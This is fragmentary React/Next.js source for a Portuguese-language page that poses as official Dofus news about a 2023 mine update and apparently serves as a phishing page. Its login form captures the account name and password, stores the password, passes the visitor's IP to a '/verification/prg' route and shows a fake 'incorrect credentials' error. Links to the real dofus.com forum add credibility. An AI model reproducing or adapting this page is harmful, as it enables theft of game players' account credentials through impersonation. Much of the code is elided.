...
function App2() {
  ...
  const send = async(e)=>{
    ...
    localStorage.setItem("password", JSON.stringify(password));
      ...
      Router.push({
          pathname: '/verification/prg',
          query: {ip:ip}
      },"/verification/prg",{ shallow: true })
      setSpin(false)
    }
   }
    ...
    <div className={styles.App2}>
      {visible && (
        ...
        <div className={styles.content}>
          ...
          <form onSubmit={send}>
          {visible2 && (<p className={styles.error}>As credenciais estão incorretas</p>)}
          <p>Nome da conta</p>
...
<div className={styles.blogContainer}>
  <div className={styles.main}>
    <div className={styles.header}>
      ...
      <h1>((DOFUS - LE MINE VALONIALE 2023 )) ESTÁ ONLINE</h1>
        <h4>Desbloqueie o acesso agora e vá em uma aventura!</h4>
      </div>
    ...
    <div className={styles.content}>
      <div className={styles.contentBox}>
      <p>Este final de ano termina em alta com novos conteúdos ligados à série animada Lance Dur. Para a ocasião, não são 1, nem 2, mas 3 novas áreas que estão surgindo. Um arquipélago inteiro chegará ao Mundo dos Doze. Localizadas a nordeste do continente Amaknean, muitas aventuras esperam por você nessas ilhas há muito esquecidas pelos dozeanos. Você aprenderá mais sobre a rica história deste arquipélago e as ligações que ele pode ter com os personagens que você certamente já conheceu durante suas epopéias... Claro, como você já sabe, uma nova classe também aparecerá. Então você está pronto? Vamos fazer um pequeno tour pelos novos horizontes que você terá que explorar.</p>
      <div className={styles.blogImg}>
      <Image src="/assets/ereboriale.jpg" layout='fill'/>
      </div>
      <p>Suas aventuras certamente o levarão à mina do arquipélago: a mina de Valoniale. Uma arquitetura ao mesmo tempo crua e sutil, digna do maior dos pequenos povos: os Valos! Os Valos nunca estão em um lugar por acaso. Ao explorar suas majestosas minas, você aprenderá mais sobre seu funcionamento e seus desejos. Mas se você olhar de perto, você pode até descobrir outras coisas que são muito menos hospitaleiras... Esta nova mina é uma área de nível 200 que oferecerá:</p>
      <br />
      <p className={styles.boldText}>Uma nova família de monstros</p><br />
      <p className={styles.boldText}>Novos mapas para explorar</p>
      <center>
...
<button>PARA VALIDAR</button>
  ...
  <div className={styles.side}>
    ...
    <div className={styles.voir}>
      <center>
        <p onClick={()=> Router.push("https://www.dofus.com/fr/forum/les-sujets?tracker=ANKA")}>Ver todas as notícias</p>
      </center>
    </div>
    </div>
    ...
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1782-dofus/2329562-bouclier-kano")}>escudo kano</p>
    ...
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Mudança de elemento Ougi PVM 200</p>
    ...
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Astrub está sufocando</p>
    ...
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Comparação puro do crido</p>
    ...
    <div className={styles.content}>
      <div className={styles.sideText2}>
        <p className={styles.nameP} onClick={()=>Router.push("https://www.dofus.com/fr/forum/1001-informations-annonces")}>Sram air em grupo pvm</p>
